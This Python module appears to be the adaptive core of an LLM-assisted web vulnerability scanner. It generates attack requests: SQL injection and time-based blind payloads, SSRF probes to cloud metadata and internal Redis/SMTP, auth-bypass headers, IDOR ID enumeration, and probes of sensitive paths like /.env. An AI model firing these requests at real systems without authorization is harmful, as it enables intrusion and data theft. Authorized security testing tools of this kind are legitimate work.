"""
Adaptive Engine — The brain changes what the hands do next, mid-run.

Instead of running a fixed battery of tests, this module:
1. Monitors early response signals (timing, errors, tech leaks)
2. Forms hypotheses from recon data
3. Dynamically re-prioritizes which vuln classes to test
4. Directs targeted requests instead of generic fuzzing
"""

import json
import re
import time
from typing import Dict, List, Any, Tuple
from urllib.parse import urlparse, parse_qs


class AdaptiveEngine:
    """
    Mid-run adaptive test selection.

    The brain looks at early signals and decides:
    - "This looks like Laravel with verbose errors → escalate to blind SQLi"
    - "JS bundle references /api/v1/admin/impersonate → test that specific endpoint"
    - "Responses are timing-uniform → skip timing-based tests, focus on error-based"
    """

    def __init__(self, llm_client=None):
        self.llm = llm_client
        self.signal_log = []
        self.hypotheses = []
        self.test_plan = []
        self.tech_fingerprints = {}

    # ─── Signal Collection ───────────────────────────────────────

    def collect_signal(self, signal_type: str, data: dict):
        """Collect a signal from early response analysis."""
        self.signal_log.append({
            "type": signal_type,
            "data": data,
            "timestamp": time.time(),
        })

    def analyze_response_signals(self, url: str, status: int, headers: dict,
                                  body: str, timing_ms: float) -> dict:
        """
        Extract signals from a single response. These feed into
        adaptive test selection.
        """
        signals = {
            "status": status,
            "timing_ms": timing_ms,
            "body_size": len(body),
            "tech_leaks": [],
            "error_patterns": [],
            "waf_indicators": [],
            "orm_indicators": [],
            "framework": None,
        }

        body_lower = body.lower()

        # ── Tech stack leaks ──
        tech_checks = {
            "laravel": ["laravel", "illuminate", "csrf-token", "x-app-version"],
            "django": ["csrfmiddleware", "django", "wsgi"],
            "rails": ["csrf-token", "ruby", "rack", "passenger"],
            "spring": ["whitelabel error", "spring", "java", "tomcat"],
            "express": ["x-powered-by: express", "express"],
            "php": ["x-powered-by: php", "phpsessid", ".php"],
            "asp.net": ["x-powered-by: asp.net", "asp.net", "viewstate"],
            "next.js": ["__next", "next.js", "x-powered-by: next.js"],
            "fastapi": ["fastapi", "uvicorn"],
        }
        for framework, markers in tech_checks.items():
            if any(m in body_lower or m in str(headers).lower() for m in markers):
                signals["framework"] = framework
                signals["tech_leaks"].append(framework)

        # ── ORM / DB error patterns ──
        orm_patterns = {
            "sqlalchemy": ["sqlalchemy", "statement", "operationalerror"],
            "sequelize": ["sequelize", "sqlterminalerror"],
            "prisma": ["prisma", "prismadb"],
            "activerecord": ["activerecord", "statementinvalid"],
            "hibernate": ["hibernate", "sqlquery"],
            "entity_framework": ["entity framework", "system.data"],
            "mongoose": ["mongoose", "casterror", "validationerror"],
            "typeorm": ["typeorm", "queryfailederror"],
        }
        for orm, patterns in orm_patterns.items():
            if any(p in body_lower for p in patterns):
                signals["orm_indicators"].append(orm)

        # ── SQL error patterns (generic) ──
        sql_errors = [
            "sql syntax", "mysql", "unclosed quotation", "odbc",
            "postgresql", "ora-", "sqlite", "mariadb", "sqlstate",
            "you have an error", "warning: mysql", "pg_query",
            "pg_exec", "sqlite3.operational", "database error",
        ]
        if any(err in body_lower for err in sql_errors):
            signals["error_patterns"].append("sql_error")

        # ── WAF indicators ──
        waf_signs = [
            "403", "blocked", "forbidden", "captcha", "waf",
            "security", "access denied", "request blocked",
            "cloudflare", "akamai", "incapsula", "sucuri",
        ]
        if any(w in body_lower for w in waf_signs):
            signals["waf_indicators"].append("detected")

        # ── Timing signals ──
        if timing_ms > 5000:
            signals["timing_ms"] = timing_ms
            signals["error_patterns"].append("slow_response")

        # Store signal
        self.collect_signal("response", signals)
        return signals

    # ─── Hypothesis Generation ───────────────────────────────────

    async def generate_hypotheses(self, recon_data: dict, early_signals: list) -> list:
        """
        Form specific hypotheses from recon data and early signals.
        This is the 'brain' forming targeted theories, not generic enumeration.
        """
        hypotheses = []

        urls = recon_data.get("urls", [])
        attack_surface = recon_data.get("attack_surface", {})
        tech_hints = recon_data.get("analysis", {}).get("tech_stack", [])

        # ── Rule-based hypotheses (fast, no LLM needed) ──

        # Hypothesis 1: JS bundle references hidden API endpoints
        for url in urls:
            if url.endswith(".js") or "bundle" in url or "chunk" in url:
                hypotheses.append({
                    "hypothesis": "JS bundle may reference hidden API endpoints",
                    "test_type": "api_discovery",
                    "target_urls": [url],
                    "priority": 8,
                    "rationale": "JS bundles often contain unreferenced API paths",
                    "tests": ["extract_api_paths_from_js"],
                })

        # Hypothesis 2: Admin panels from common paths
        admin_paths = ["/admin", "/admin/", "/admin/login", "/wp-admin",
                       "/dashboard", "/manage", "/panel", "/console"]
        for url in urls:
            parsed = urlparse(url)
            for admin_path in admin_paths:
                if parsed.path.startswith(admin_path):
                    hypotheses.append({
                        "hypothesis": f"Admin panel at {admin_path} may have weak access control",
                        "test_type": "auth_bypass",
                        "target_urls": [url],
                        "priority": 9,
                        "rationale": "Admin panels are high-value targets",
                        "tests": ["method_tampering", "path_traversal", "header_injection"],
                    })
                    break

        # Hypothesis 3: API endpoints with IDOR potential
        api_urls = [u for u in urls if "/api/" in u or "/v1/" in u or "/v2/" in u]
        for url in api_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            path_parts = parsed.path.strip("/").split("/")

            # Check for numeric IDs in path
            for i, part in enumerate(path_parts):
                if part.isdigit():
                    hypotheses.append({
                        "hypothesis": f"API endpoint with numeric ID at position {i} — IDOR potential",
                        "test_type": "idor",
                        "target_urls": [url],
                        "priority": 7,
                        "rationale": f"Path contains numeric ID '{part}' — try incrementing/decrementing",
                        "tests": ["path_id_manipulation"],
                        "params": {"path_index": i, "original_id": part},
                    })

            # Check for user-related params
            for param_name in params:
                if any(k in param_name.lower() for k in ("user", "id", "uid", "account", "profile")):
                    hypotheses.append({
                        "hypothesis": f"Parameter '{param_name}' may be vulnerable to IDOR",
                        "test_type": "idor",
                        "target_urls": [url],
                        "priority": 7,
                        "rationale": f"User-related parameter '{param_name}'",
                        "tests": ["param_id_manipulation"],
                        "params": {"param": param_name},
                    })

        # Hypothesis 4: SSRF-prone parameters
        ssrf_params = ("url", "uri", "file", "path", "dest", "redirect",
                       "fetch", "load", "img", "src", "image", "avatar",
                       "link", "href", "next", "callback", "webhook")
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param_name in params:
                if any(k in param_name.lower() for k in ssrf_params):
                    hypotheses.append({
                        "hypothesis": f"SSRF via '{param_name}' parameter",
                        "test_type": "ssrf",
                        "target_urls": [url],
                        "priority": 8,
                        "rationale": f"Parameter '{param_name}' suggests URL/fetch functionality",
                        "tests": ["ssrf_internal", "ssrf_protocol_smuggling", "ssrf_dns_rebinding"],
                        "params": {"param": param_name},
                    })

        # ── Signal-based hypotheses (from early responses) ──
        for signal in early_signals:
            if signal.get("type") == "response":
                data = signal.get("data", {})

                # SQL error seen → hypothesize SQLi
                if "sql_error" in data.get("error_patterns", []):
                    hypotheses.append({
                        "hypothesis": "SQL errors in responses — likely SQLi vulnerable",
                        "test_type": "sqli",
                        "target_urls": urls[:5],
                        "priority": 10,
                        "rationale": "SQL error messages leaked in responses",
                        "tests": ["error_based_sqli", "blind_sqli", "time_based_sqli"],
                    })

                # Slow response → hypothesize time-based blind
                if "slow_response" in data.get("error_patterns", []):
                    hypotheses.append({
                        "hypothesis": "Slow responses — may be time-based blind SQLi",
                        "test_type": "sqli_time",
                        "target_urls": urls[:3],
                        "priority": 8,
                        "rationale": f"Response took {data.get('timing_ms', 0)}ms",
                        "tests": ["time_based_blind"],
                    })

                # Framework detected → framework-specific tests
                framework = data.get("framework")
                if framework:
                    hypotheses.append({
                        "hypothesis": f"Target runs {framework} — test framework-specific vulns",
                        "test_type": "framework_specific",
                        "target_urls": urls[:5],
                        "priority": 7,
                        "rationale": f"Detected {framework} framework",
                        "tests": [f"{framework}_specific"],
                    })

        # ── LLM-enhanced hypotheses (if available) ──
        if self.llm and len(hypotheses) < 3:
            try:
                llm_hypotheses = await self._llm_generate_hypotheses(recon_data, early_signals)
                hypotheses.extend(llm_hypotheses)
            except Exception:
                pass

        # Sort by priority
        hypotheses.sort(key=lambda h: h.get("priority", 0), reverse=True)
        self.hypotheses = hypotheses
        return hypotheses

    async def _llm_generate_hypotheses(self, recon_data: dict, early_signals: list) -> list:
        """Use LLM to generate creative hypotheses."""
        prompt = f"""You are a security researcher analyzing a target.

RECON DATA:
- Target: {recon_data.get('target', 'unknown')}
- URLs found: {len(recon_data.get('urls', []))} URLs
- Tech stack: {recon_data.get('analysis', {}).get('tech_stack', [])}
- Attack surface: {json.dumps(recon_data.get('attack_surface', {}), indent=2)[:2000]}

EARLY SIGNALS:
{json.dumps(early_signals[:10], indent=2)[:2000]}

Generate 2-3 specific, testable hypotheses about what vulnerabilities this target likely has.
Focus on:
1. What the tech stack suggests (framework-specific vulns)
2. What the URL patterns suggest (IDOR, SSRF, etc.)
3. What early response signals suggest

Return JSON:
{{
    "hypotheses": [
        {{
            "hypothesis": "specific testable theory",
            "test_type": "idor|ssrf|xss|sqli|auth_bypass|ssti|lfi|command_injection",
            "priority": 1-10,
            "rationale": "why this hypothesis makes sense",
            "tests": ["specific_test_to_run"]
        }}
    ]
}}"""

        response = await self.llm.generate(prompt, model="glm")
        try:
            parsed = json.loads(response)
            return parsed.get("hypotheses", [])
        except (json.JSONDecodeError, ValueError):
            return []

    # ─── Adaptive Test Plan ──────────────────────────────────────

    def build_test_plan(self, hypotheses: list, vuln_classes: list,
                         signal_summary: dict) -> list:
        """
        Build a dynamic test plan based on hypotheses and signals.
        This replaces the fixed test battery.
        """
        plan = []

        # Start with high-priority hypotheses
        for hyp in hypotheses[:5]:
            test_type = hyp.get("test_type", "")
            if test_type in vuln_classes or test_type == "framework_specific":
                plan.append({
                    "vuln_class": test_type,
                    "hypothesis": hyp.get("hypothesis"),
                    "priority": hyp.get("priority", 5),
                    "tests": hyp.get("tests", []),
                    "target_urls": hyp.get("target_urls", []),
                    "params": hyp.get("params", {}),
                    "mode": "hypothesis_driven",
                })

        # Fill remaining slots with adaptive prioritization
        for vc in vuln_classes:
            if not any(p["vuln_class"] == vc for p in plan):
                priority = self._calculate_adaptive_priority(vc, signal_summary)
                if priority > 0:
                    plan.append({
                        "vuln_class": vc,
                        "hypothesis": None,
                        "priority": priority,
                        "tests": [],
                        "target_urls": [],
                        "params": {},
                        "mode": "adaptive_enumeration",
                    })

        # Sort by priority
        plan.sort(key=lambda p: p.get("priority", 0), reverse=True)
        self.test_plan = plan
        return plan

    def _calculate_adaptive_priority(self, vuln_class: str, signals: dict) -> int:
        """
        Calculate priority for a vuln class based on observed signals.
        Higher = test first. 0 = skip entirely.
        """
        priority_map = {
            "idor": 5,
            "ssrf": 5,
            "xss": 5,
            "sqli": 5,
            "auth_bypass": 5,
            "ssti": 4,
            "open_redirect": 4,
            "lfi": 5,
            "command_injection": 4,
            "nosqli": 4,
            "graphql": 3,
            "xxe": 3,
            "prototype_pollution": 3,
            "race_condition": 2,
            "deserialization": 3,
        }

        base_priority = priority_map.get(vuln_class, 3)

        # Boost if signals suggest this vuln class
        if vuln_class == "sqli":
            if "sql_error" in signals.get("error_patterns", []):
                base_priority += 5  # SQL errors seen → definitely test SQLi
            if signals.get("orm_indicators"):
                base_priority += 3  # ORM detected → test ORM-specific SQLi

        if vuln_class == "xss":
            if signals.get("framework") in ("django", "rails", "express", "laravel"):
                base_priority += 2  # Web frameworks often have XSS

        if vuln_class == "ssrf":
            if any(p in str(signals) for p in ("url", "fetch", "load", "redirect")):
                base_priority += 3

        if vuln_class == "auth_bypass":
            if signals.get("framework") in ("spring", "django", "express"):
                base_priority += 2

        if vuln_class == "lfi":
            if signals.get("framework") in ("php", "laravel"):
                base_priority += 3  # PHP is prone to LFI

        if vuln_class == "ssti":
            if signals.get("framework") in ("django", "flask", "jinja2"):
                base_priority += 4  # Jinja2 = SSTI risk

        # Deprioritize if WAF detected
        if signals.get("waf_indicators"):
            if vuln_class in ("xss", "sqli", "command_injection"):
                base_priority -= 2  # WAF likely blocks these

        # Skip timing-based tests if responses are uniform
        if signals.get("timing_uniform"):
            if vuln_class == "sqli" and "time_based" in str(signals):
                base_priority = 0  # Skip time-based if timing is uniform

        return max(0, base_priority)

    # ─── Hypothesis-Driven Request Generation ────────────────────

    def generate_hypothesis_requests(self, hypothesis: dict) -> list:
        """
        Generate specific HTTP requests to test a hypothesis.
        Instead of generic fuzzing, these are targeted.
        """
        requests = []
        test_type = hypothesis.get("test_type", "")
        target_urls = hypothesis.get("target_urls", [])
        params = hypothesis.get("params", {})

        if test_type == "idor":
            requests.extend(self._gen_idor_requests(target_urls, params))
        elif test_type == "ssrf":
            requests.extend(self._gen_ssrf_requests(target_urls, params))
        elif test_type == "auth_bypass":
            requests.extend(self._gen_auth_bypass_requests(target_urls))
        elif test_type == "sqli":
            requests.extend(self._gen_sqli_requests(target_urls, params))
        elif test_type == "sqli_time":
            requests.extend(self._gen_time_sqli_requests(target_urls, params))
        elif test_type == "api_discovery":
            requests.extend(self._gen_api_discovery_requests(target_urls))
        elif test_type == "framework_specific":
            requests.extend(self._gen_framework_requests(target_urls, params))

        return requests

    def _gen_idor_requests(self, urls: list, params: dict) -> list:
        """Generate targeted IDOR test requests."""
        requests = []
        path_index = params.get("path_index")
        original_id = params.get("original_id")

        for url in urls:
            parsed = urlparse(url)
            path_parts = parsed.path.strip("/").split("/")

            if path_index is not None and original_id:
                # Path-based IDOR
                for offset in [1, -1, 100, -100]:
                    try:
                        new_id = str(int(original_id) + offset)
                    except ValueError:
                        continue
                    new_parts = list(path_parts)
                    new_parts[path_index] = new_id
                    new_url = f"{parsed.scheme}://{parsed.netloc}/{'/'.join(new_parts)}"
                    if parsed.query:
                        new_url += f"?{parsed.query}"
                    requests.append({
                        "method": "GET",
                        "url": new_url,
                        "description": f"IDOR: path ID {original_id} → {new_id}",
                        "vuln_class": "idor",
                    })

            # Param-based IDOR
            param_name = params.get("param")
            if param_name:
                query_params = parse_qs(parsed.query)
                if param_name in query_params:
                    original_val = query_params[param_name][0]
                    for test_val in ["1", "2", "0", "99999", str(int(original_val or 0) + 1)]:
                        new_params = dict(query_params)
                        new_params[param_name] = [test_val]
                        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
                        requests.append({
                            "method": "GET",
                            "url": new_url,
                            "description": f"IDOR: {param_name} {original_val} → {test_val}",
                            "vuln_class": "idor",
                        })

        return requests

    def _gen_ssrf_requests(self, urls: list, params: dict) -> list:
        """Generate targeted SSRF test requests."""
        requests = []
        param_name = params.get("param", "url")

        ssrf_payloads = [
            ("http://127.0.0.1", "Loopback"),
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            ("http://metadata.google.internal/", "GCP metadata"),
            ("http://10.0.0.1", "Internal network"),
            ("gopher://127.0.0.1:25/", "SMTP via gopher"),
            ("dict://127.0.0.1:6379/", "Redis via dict"),
        ]

        for url in urls:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)

            for payload, description in ssrf_payloads:
                new_params = dict(query_params)
                new_params[param_name] = [payload]
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
                requests.append({
                    "method": "GET",
                    "url": new_url,
                    "description": f"SSRF: {description}",
                    "vuln_class": "ssrf",
                    "payload": payload,
                })

        return requests

    def _gen_auth_bypass_requests(self, urls: list) -> list:
        """Generate targeted auth bypass test requests."""
        requests = []

        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Admin": "true"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"Authorization": "Bearer test"},
            {"Cookie": "admin=true"},
        ]

        for url in urls:
            for headers in bypass_headers:
                requests.append({
                    "method": "GET",
                    "url": url,
                    "headers": headers,
                    "description": f"Auth bypass: {list(headers.keys())[0]}",
                    "vuln_class": "auth_bypass",
                })

            # Method tampering
            for method in ["PUT", "DELETE", "PATCH", "OPTIONS"]:
                requests.append({
                    "method": method,
                    "url": url,
                    "description": f"Method tampering: {method}",
                    "vuln_class": "auth_bypass",
                })

        return requests

    def _gen_sqli_requests(self, urls: list, params: dict) -> list:
        """Generate targeted SQLi test requests."""
        requests = []
        param_name = params.get("param")

        sqli_payloads = [
            ("' OR '1'='1", "Basic auth bypass"),
            ("1' ORDER BY 100--", "Column count enumeration"),
            ("' UNION SELECT NULL--", "UNION based"),
            ("1' AND 1=1--", "Boolean based"),
        ]

        for url in urls:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)

            target_params = [param_name] if param_name else list(query_params.keys())

            for pname in target_params[:3]:
                for payload, description in sqli_payloads:
                    new_params = dict(query_params)
                    new_params[pname] = [payload]
                    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
                    requests.append({
                        "method": "GET",
                        "url": new_url,
                        "description": f"SQLi: {description} in {pname}",
                        "vuln_class": "sqli",
                        "payload": payload,
                    })

        return requests

    def _gen_time_sqli_requests(self, urls: list, params: dict) -> list:
        """Generate time-based blind SQLi test requests."""
        requests = []
        time_payloads = [
            ("1' AND SLEEP(5)--", 5),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ("1'; WAITFOR DELAY '0:0:5'--", 5),
        ]

        for url in urls[:3]:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)

            for pname in list(query_params.keys())[:2]:
                for payload, delay in time_payloads:
                    new_params = dict(query_params)
                    new_params[pname] = [payload]
                    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
                    requests.append({
                        "method": "GET",
                        "url": new_url,
                        "description": f"Time-based SQLi: {delay}s delay",
                        "vuln_class": "sqli",
                        "payload": payload,
                        "expected_delay": delay,
                        "timeout": delay + 5,
                    })

        return requests

    def _gen_api_discovery_requests(self, urls: list) -> list:
        """Generate requests to discover hidden API endpoints from JS."""
        requests = []
        api_patterns = [
            "/api/", "/api/v1/", "/api/v2/", "/graphql",
            "/internal/", "/admin/api/", "/debug/",
        ]

        for url in urls:
            for pattern in api_patterns:
                requests.append({
                    "method": "GET",
                    "url": url.replace(url.split("/")[-1], pattern),
                    "description": f"API discovery: {pattern}",
                    "vuln_class": "api_discovery",
                })

        return requests

    def _gen_framework_requests(self, urls: list, params: dict) -> list:
        """Generate framework-specific test requests."""
        requests = []
        framework = params.get("framework", "")

        framework_tests = {
            "laravel": ["/_ignition/health-check", "/telescope", "/horizon"],
            "django": ["/admin/", "/static/admin/", "/__debug__/"],
            "rails": ["/rails/info", "/rails/mailers", "/ Sidekiq"],
            "spring": ["/actuator", "/actuator/env", "/actuator/health"],
            "express": ["/", "/api/", "/graphql"],
            "php": ["/phpinfo.php", "/info.php", "/.env"],
        }

        tests = framework_tests.get(framework, [])
        for url in urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for test_path in tests:
                requests.append({
                    "method": "GET",
                    "url": f"{base}{test_path}",
                    "description": f"{framework} specific: {test_path}",
                    "vuln_class": "framework_specific",
                })

        return requests

    # ─── Signal Summary ──────────────────────────────────────────

    def get_signal_summary(self) -> dict:
        """Summarize all collected signals for test plan decisions."""
        summary = {
            "error_patterns": [],
            "tech_leaks": [],
            "waf_indicators": [],
            "orm_indicators": [],
            "timing_data": [],
            "framework": None,
        }

        for signal in self.signal_log:
            if signal["type"] == "response":
                data = signal["data"]
                summary["error_patterns"].extend(data.get("error_patterns", []))
                summary["tech_leaks"].extend(data.get("tech_leaks", []))
                summary["waf_indicators"].extend(data.get("waf_indicators", []))
                summary["orm_indicators"].extend(data.get("orm_indicators", []))
                summary["timing_data"].append(data.get("timing_ms", 0))
                if data.get("framework"):
                    summary["framework"] = data["framework"]

        # Deduplicate
        summary["error_patterns"] = list(set(summary["error_patterns"]))
        summary["tech_leaks"] = list(set(summary["tech_leaks"]))
        summary["orm_indicators"] = list(set(summary["orm_indicators"]))

        # Check timing uniformity
        timings = summary["timing_data"]
        if len(timings) > 3:
            avg = sum(timings) / len(timings)
            variance = sum((t - avg) ** 2 for t in timings) / len(timings)
            summary["timing_uniform"] = variance < 100  # Low variance = uniform

        return summary
